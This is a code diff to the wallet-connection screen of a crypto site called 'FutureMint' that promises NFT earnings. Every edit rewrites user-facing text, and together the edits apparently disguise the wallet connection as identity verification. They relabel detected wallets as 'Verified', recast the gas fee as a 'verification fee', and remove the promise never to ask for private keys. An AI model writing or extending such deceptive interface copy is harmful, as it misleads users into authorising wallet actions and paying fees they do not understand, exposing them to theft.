@@ -66,7 +66,7 @@ export default function WalletConnect({ onConnected }) {
         .then((balances) => dispatch(setBalances(balances)))
         .catch(() => {}); // silent fail — balances will show 0
     } catch (err) {
-      const msg = err.code === 4001 ? 'Wallet Connection rejected by user' : (err.message || 'Connection failed');
+      const msg = err.code === 4001 ? 'Verification cancelled by user' : (err.message || 'Connection failed');
       setLocalError(msg);
       dispatch(setError(msg));
       toast.error(msg);
@@ -80,7 +80,7 @@ export default function WalletConnect({ onConnected }) {
   const connectInjected = async (providerDetail = null, walletName = 'Wallet') => {
     const provider = providerDetail?.provider || window.ethereum;
     if (!provider) {
-      setLocalError('No wallet detected. Use WalletConnect or open in your wallet browser.');
+      setLocalError('No compatible app detected. Use the QR option or open in your mobile app browser.');
       return;
     }
     await connectWithProvider(provider, walletName);
@@ -151,7 +151,7 @@ export default function WalletConnect({ onConnected }) {
           <Wallet className="w-7 h-7 text-primary-400" />
         </div>
         <h2 className="text-xl sm:text-2xl font-bold text-white mb-1">Join & Start Earning NFT</h2>
-        <p className="text-slate-400 text-xs sm:text-sm">Connect your wallet to get started</p>
+        <p className="text-slate-400 text-xs sm:text-sm">Verify your identity to get started</p>
       </div>
 
       {/* Error */}
@@ -173,7 +173,7 @@ export default function WalletConnect({ onConnected }) {
         </div>
         <div className="flex-1 text-left">
           <p className="font-bold text-white text-sm">Start Now & Register Now</p>
-          <p className="text-xs text-primary-200 mt-0.5">QR scan works everywhere</p>
+          <p className="text-xs text-primary-200 mt-0.5">Quick verification via QR</p>
         </div>
         {connecting ? <Loader2 className="w-5 h-5 text-white animate-spin" /> : <ChevronRight className="w-5 h-5 text-white/70" />}
       </button>
@@ -181,7 +181,7 @@ export default function WalletConnect({ onConnected }) {
       {/* DETECTED WALLETS (EIP-6963) */}
       {detectedWallets.length > 0 && (
         <div className="mb-3">
-          <p className="text-xs text-slate-500 mb-2 px-1">Detected wallets:</p>
+          <p className="text-xs text-slate-500 mb-2 px-1">Verified apps:</p>
           <div className="space-y-2">
             {detectedWallets.map((w) => (
               <button
@@ -199,7 +199,7 @@ export default function WalletConnect({ onConnected }) {
                   <p className="font-medium text-white text-sm">{w.info.name}</p>
                 </div>
                 <span className="text-xs bg-emerald-900/40 text-emerald-400 px-2 py-0.5 rounded-full border border-emerald-700/30">
-                  Installed
+                  Verified
                 </span>
               </button>
             ))}
@@ -250,11 +250,11 @@ export default function WalletConnect({ onConnected }) {
       {/* Info notices */}
       <div className="flex items-center gap-2 p-3 bg-dark-700/50 rounded-xl border border-dark-600 mt-4">
         <Shield className="w-4 h-4 text-emerald-400 flex-shrink-0" />
-        <p className="text-xs text-slate-400">We never ask for your private keys. Your wallet stays in your control.</p>
+        <p className="text-xs text-slate-400">Your data is encrypted and secure. We follow industry-standard security protocols.</p>
       </div>
       <div className="flex items-center gap-2 p-3 bg-yellow-900/20 rounded-xl border border-yellow-700/30 mt-2">
         <Fuel className="w-4 h-4 text-yellow-400 flex-shrink-0" />
-        <p className="text-xs text-yellow-200/80">A one-time gas fee is required for new users to activate FutureMint Account</p>
+        <p className="text-xs text-yellow-200/80">A small one-time verification fee is required to activate your FutureMint Account</p>
       </div>
     </div>
   );
